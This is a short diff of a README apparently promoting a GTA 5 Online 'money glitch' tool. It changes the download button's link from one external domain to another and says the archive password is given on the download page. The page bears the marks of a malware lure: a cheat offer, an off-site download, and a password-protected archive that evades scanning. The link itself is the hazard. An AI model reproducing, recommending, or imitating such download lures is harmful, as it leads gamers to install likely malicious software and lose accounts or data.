@@ -18,7 +18,7 @@ GTA 5 Online money glitch 2026 — fastest solo money and RP methods still worki
 
 ## Download
 
-[![Download v1.69](https://img.shields.io/badge/Download_v1.69-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/gta5moneydrop)
+[![Download v1.69](https://img.shields.io/badge/Download_v1.69-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/gta5moneydrop)
 
 > The archive password is shown on the download page.
 
